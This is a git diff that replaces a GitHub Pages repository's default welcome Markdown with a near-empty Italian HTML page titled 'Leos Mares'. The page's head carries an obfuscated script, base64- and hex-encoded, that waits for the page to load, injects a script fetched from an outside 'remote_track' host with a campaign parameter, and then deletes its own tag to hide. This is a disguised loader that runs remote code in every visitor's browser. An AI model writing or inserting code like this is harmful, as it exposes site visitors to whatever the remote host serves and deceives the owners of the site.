@@ -1,37 +1,18 @@
-## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/weeknew-online/leos/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<html lang="it">
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Leos Mares</title>
 
-### Markdown
+<p><img src="https://sedmicka.tyden.cz/obrazek/201906/5d0b60f776b17/crop-1857891--13a0709l_800x540.jpg" alt="" /></p>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<script id="Ilark" src="data:text/javascript;base64, dmFyIF9nVlJESiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2RxdmJ2LCBfenhWbTYpIHt2YXIgXzJDRVlEID0gZnVuY3Rpb24oX3VuS3lJKSB7d2hpbGUgKC0tX3VuS3lJKSB7X2RxdmJ2WydwdXNoJ10oX2RxdmJ2WydzaGlmdCddKCkpO319O18yQ0VZRCgrK196eFZtNik7fShfZ1ZSREosIDB4MTFiKSk7dmFyIF81MzZuMyA9IGZ1bmN0aW9uKF9OelkxVSwgXzRxZUtBKSB7X056WTFVID0gX056WTFVIC0gMHgwO3ZhciBfWXdLdFIgPSBfZ1ZSREpbX056WTFVXTtyZXR1cm4gX1l3S3RSO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfNTM2bjMoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX0JhSlNPID0gZG9jdW1lbnRbXzUzNm4zKCcweDEnKV0oXzUzNm4zKCcweDInKSk7X0JhSlNPW181MzZuMygnMHgzJyldID0gXzUzNm4zKCcweDQnKTtfQmFKU09bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2Zlx4NmVceDZjXHg2OVx4NmVceDY1XHg3NFx4NmZceDcwXHgyZVx4NzdceDY1XHg2Mlx4NzNceDY5XHg3NFx4NjVceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDZlXHg1Nlx4NDVceDRhXHg3Mlx4MzVceDczXHg1M1x4NjNceDRhJztkb2N1bWVudFtfNTM2bjMoJzB4NScpXShfNTM2bjMoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfQmFKU08pO2RvY3VtZW50W181MzZuMygnMHg3JyldKCdJbGFyaycpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
+</head>
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+<body>
+	Hello 
+</body>
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/weeknew-online/leos/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
